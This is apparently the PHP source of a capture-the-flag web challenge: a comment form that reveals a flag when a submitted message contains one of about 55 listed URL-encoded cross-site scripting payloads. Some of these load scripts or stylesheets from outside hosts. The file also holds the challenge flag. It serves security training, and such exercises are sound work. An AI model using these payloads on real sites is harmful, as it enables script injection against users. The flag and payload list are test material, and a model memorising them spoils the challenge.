<?php
session_start();

$messageReceived = isset($_SESSION['message_received']) ? $_SESSION['message_received'] : false;
$flag = isset($_SESSION['flag']) ? $_SESSION['flag'] : false;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fname = htmlspecialchars($_POST["fname"]);
    $lname = htmlspecialchars($_POST["lname"]);
    $message = $_POST["message"];

    // Define an array of allowed payloads
    $allowed_payloads = array(
        // Critical XSS payloads
        '%22%3e%3cscript%2fsrc%3d%22%2f%2fxss.com%22%3e%3c%2fscript%3e',
        '%22%3e%3cscript%2fsrc%3d%22%2f%2fxss.com%22%3e%3c%2fscript%3e',
        '%22%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3cimg%20src%3d%22javascript%3aalert%28%27XSS%27%29%22%3e',
        '%22%3e%3cimg%20src%3d%22javascript%3aalert%28%27XSS%27%29%22%3e',
        '%22%3e%3ciframe%20src%3d%22javascript%3aalert%28%27XSS%27%29%22%3e%3c%2fiframe%3e',
        '%22%3e%3ciframe%20src%3d%22javascript%3aalert%28%27XSS%27%29%22%3e%3c%2fiframe%3e',
        '%22%3e%3ca%20href%3d%22javascript%3aalert%28%27XSS%27%29%22%3eClick%20Me%3c%2fa%3e',
        '%22%3e%3ca%20href%3d%22javascript%3aalert%28%27XSS%27%29%22%3eClick%20Me%3c%2fa%3e',
        '%22%3e%3cmarquee%3e%3c%2fmarquee%3e%3cimg%20src%3d%22%22%20onerror%3d%22alert%28%27XSS%27%29%22%3e',
        '%22%3e%3cmarquee%3e%3c%2fmarquee%3e%3cimg%20src%3d%22%22%20onerror%3d%22alert%28%27XSS%27%29%22%3e',
        '%22%3e%3cform%20action%3d%22javascript%3aalert%28%27XSS%27%29%22%3e%3c%2fform%3e',
        '%22%3e%3cform%20action%3d%22javascript%3aalert%28%27XSS%27%29%22%3e%3c%2fform%3e',
        '%22%3e%3cinput%20type%3d%22text%22%20value%3d%22%22%20onchange%3d%22alert%28%27XSS%27%29%22%3e',
        '%22%3e%3cinput%20type%3d%22text%22%20value%3d%22%22%20onchange%3d%22alert%28%27XSS%27%29%22%3e',
        '%22%3e%3ctable%3e%3ctr%3e%3ctd%20onclick%3d%22alert%28%27XSS%27%29%22%3eClick%20Me%3c%2ftd%3e%3c%2ftr%3e%3c%2ftable%3e',
        '%22%3e%3ctable%3e%3ctr%3e%3ctd%20onclick%3d%22alert%28%27XSS%27%29%22%3eClick%20Me%3c%2ftd%3e%3c%2ftr%3e%3c%2ftable%3e',
        '%22%3e%3cstyle%3e%3c%2fstyle%3e%3c%2ftitle%3e%3c%2fhead%3e%3c%2fhtml%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3cstyle%3e%3c%2fstyle%3e%3c%2ftitle%3e%3c%2fhead%3e%3c%2fhtml%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3ch1%3e%3c%2fh1%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3ch1%3e%3c%2fh1%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3c%2ftitle%3e%3c%2fstyle%3e%3c%2fhead%3e%3c%2fhtml%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3c%2ftitle%3e%3c%2fstyle%3e%3c%2fhead%3e%3c%2fhtml%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3ciframe%20srcdoc%3d%22%3cscript%3ealert%281%29%3c%2fscript%3e%22%3e%3c%2fiframe%3e',
        '%22%3e%3ciframe%20srcdoc%3d%22%3cscript%3ealert%281%29%3c%2fscript%3e%22%3e%3c%2fiframe%3e',
        '%22%3e%3cdiv%20style%3d%22background-image%3a%20url%28javascript%3aalert%28%27XSS%27%29%29%3b%22%3e%3c%2fdiv%3e',
        '%22%3e%3cdiv%20style%3d%22background-image%3a%20url%28javascript%3aalert%28%27XSS%27%29%29%3b%22%3e%3c%2fdiv%3e',
        '%22%3e%3cdiv%20style%3d%22background-image%3a%20url%28javascript%3aalert%28%27XSS%27%29%29%3b%22%3e%3c%2fdiv%3e',
        '%22%3e%3csvg%2fonload%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3cimg%2fsrc%2fonerror%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3cscript%2fsrc%3d%22%2f%2fxss.com%22%3e%3c%2fscript%3e',
        'javascript%3aalert%28%27XSS%27%29%2f%2f',
        'javascript%3aeval%28%22alert%28%27XSS%27%29%22%29',
        'javascript%3a%2f%2f%250d%250aalert%28%27XSS%27%29',
        'data%3atext%2fhtml%2c%3csvg%2fonload%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3cbody%2fonload%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3ciframe%2fonload%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3cisindex%20formaction%3djavascript%3aalert%28%27XSS%27%29%20type%3dimage%3e',
        '%22%3c%2fscript%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e',
        '%22%3e%3cscript%3econfirm%601%60%3c%2fscript%3e',
        '%22%3e%3cimg%2fsrc%3d%60%2500%60%20onerror%3dalert%28%27XSS%27%29%3e',
        '%22%60%27%3e%3cimg%20src%3dx%20onerror%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3csvg%3e%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e%3c%2fsvg%3e',
        '%22%3e%3cbase%20href%3d%22javascript%3aalert%28%27XSS%27%29%2f%2f%22%3e',
        '%22%3e%3cobject%2fdata%3d%22data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3d%3d%22%2f%2f%3e',
        '%22%3e%3cdetails%2fopen%2fontoggle%3dalert%601%60%3e',
        '%22%3e%3cembed%2fsrc%3d%22data%3atext%2fhtml%2c%253csvg%2520onload%253dalert%25281%2529%253e%22%3e',
        '%22%3e%3cform%2faction%3djavascript%3aalert%28%27XSS%27%29%3e%3cinput%2ftype%3dsubmit%3e',
        '%22%3e%3cxmp%3e%3cimg%20src%3d%221%22%20onerror%3d%22alert%28%27XSS%27%29%22%3e%3c%2fxmp%3e',
        '%22%3e%3cplaintext%2fonmouseover%3d%22alert%28%27XSS%27%29%22%20%22%3e',
        '%22%20onmouseover%3d%22alert%28%27XSS%27%29%22%20%22',
        '%22%3e%3cimg%2fsrc%3d%40%28x%3d%22%60%3e%3cx%3e%22%3e%60%7b%7b%22onerror%3dalert%28%27XSS%27%29%2f%2f%27',
        '%22%3e%3cimg%2fsrcset%3d1%20onerror%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3cvideo%2fsrc%3d1%20onerror%3dalert%28%27XSS%27%29%3e',
        '%22%3e%3cstyle%3e%40import%60%2f%2fxss.cx%2fxss.css%60%3c%2fstyle%3e',
    );

    // Check if the message contains any of the allowed payloads
    foreach ($allowed_payloads as $payload) {
        if (strpos(urldecode($message), urldecode($payload)) !== false) {
            $flag = true;
            break;
        }
    }

    $_SESSION['message_received'] = true;
    $_SESSION['flag'] = $flag;
    
    // Redirect to the same page to prevent form resubmission
    header("Location: {$_SERVER['REQUEST_URI']}");
    exit();
}

// Clear session variables
unset($_SESSION['message_received']);
unset($_SESSION['flag']);
?>
<!DOCTYPE html>
<html>

<head>
    <title>C0Om3nts</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }

        h1 {
            text-align: center;
            margin-bottom: 20px;
        }

        h3 {
            text-align: center;
            margin-bottom: 30px;
        }

        form {
            text-align: left;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #333;
        }

        label {
            display: block;
            margin-bottom: 10px;
            color: #fff;
        }

        input[type="text"],
        textarea,
        input[type="submit"] {
            margin-bottom: 10px;
            padding: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
            width: 100%;
            box-sizing: border-box;
        }

        input[type="submit"] {
            background-color: #333;
            color: #fff;
            cursor: pointer;
            width: auto;
            text-align: center;
        }

        /* Center the message notification */
        .message-notification {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Leave a message for an administrator</h1>
        <h3>Our administrative team regularly reviews every message</h3>
        <?php if ($messageReceived) : ?>
            <?php if ($flag) : ?>
                <p>Flag: flag{s3cr3t-r3v1l3d-H3H3}</p>
            <?php else : ?>
                <p class="message-notification">Message received! 👉😎👉</p>
            <?php endif; ?>
        <?php endif; ?>
        <form method="post" action="">
            <label for="fname">First Name:</label>
            <input type="text" id="fname" name="fname"><br>
            <label for="lname">Last Name:</label>
            <input type="text" id="lname" name="lname"><br>
            <label for="message">Message:</label>
            <textarea id="message" name="message"></textarea><br>
            <input type="submit" value="Submit">
        </form>
    </div>
</body>

</html>
